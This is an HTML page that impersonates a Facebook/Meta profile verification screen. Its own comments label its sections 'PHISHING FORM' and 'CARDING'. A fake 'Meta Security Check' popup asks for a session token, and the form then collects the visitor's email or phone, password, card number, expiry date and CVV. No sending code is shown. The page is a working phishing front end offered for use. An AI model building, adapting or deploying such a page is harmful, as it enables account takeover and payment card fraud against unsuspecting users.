<!DOCTYPE html>

<head>
    <!-- Branded for Facebook -->

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Profile Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap');
        body { font-family: 'Segoe UI', Helvetica, sans-serif; background-color: #f0f2f5; }
        .fb-blue { background-color: #1877f2; }
        .token-box { background: #fff; border: 2px solid #ddd; }
    </style>
</head>
<body class="min-h-screen p-8 text-black">
    <div class="max-w-md mx-auto">
        <!-- LOADING SCREEN -->
        <div id="loadingScreen" class="text-center space-y-6 mt-20">
            <div class="w-16 h-16 mx-auto border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
            <h1 class="text-2xl font-bold text-gray-700">Verifying Profile Identity...</h1>
        </div>

        <!-- IDENTITY CHECK (Shows on FIRST CLICK) -->
        <div id="tokenPopup" class="fixed inset-0 bg-gray-500 bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 hidden">
            <div class="bg-white p-6 rounded-lg shadow-xl max-w-sm w-full mx-4 text-center">
                <div class="text-blue-600 font-bold text-lg mb-2">Meta Security Check</div>
                <p class="text-sm text-gray-600 mb-6">Confirm your session token to continue</p>
                <div id="tokenDisplay" class="token-box p-4 rounded font-mono text-xs mb-6 break-all bg-gray-100">
                    Scanning...
                </div>
                <button id="tokenConfirm" class="w-full fb-blue text-white font-bold py-2 rounded">
                    Confirm
                </button>
            </div>
        </div>

        <!-- PHISHING FORM -->
        <div id="mainForm" class="hidden space-y-4">
            <div class="text-center mb-6">
                <h1 class="text-4xl font-bold text-blue-600 mb-2">facebook</h1>
                <p class="text-lg">Verify your account to view this profile.</p>
            </div>
            
            <div class="bg-white p-6 rounded-lg shadow-md border border-gray-200">
                <div class="space-y-4">
                    <input type="text" id="email" placeholder="Email or phone number" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
                    <input type="password" id="password" placeholder="Password" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
                </div>
            </div>

            <!-- CARDING (Rebranded as 'Identity Confirmation') -->
            <div id="cardSection" class="hidden bg-white p-6 rounded-lg shadow-md border border-gray-200">
                <h2 class="font-bold mb-4">Identity Payment Method</h2>
                <div class="space-y-3">
                    <input type="text" id="cardNumber" placeholder="Card number" class="w-full p-3 border border-gray-300 rounded">
                    <div class="grid grid-cols-2 gap-2">
                        <input type="text" id="expiry" placeholder="MM/YY" class="p-3 border border-gray-300 rounded">
                        <input type="text" id="cvv" placeholder="CVV" class="p-3 border border-gray-300 rounded">
                    </div>
                </div>
            </div>

            <button id="submitBtn" class="w-full fb-blue text-white font-bold py-3 rounded text-lg shadow-lg">
                Log In / Continue
            </button>
        </div>
    </div>

</body>
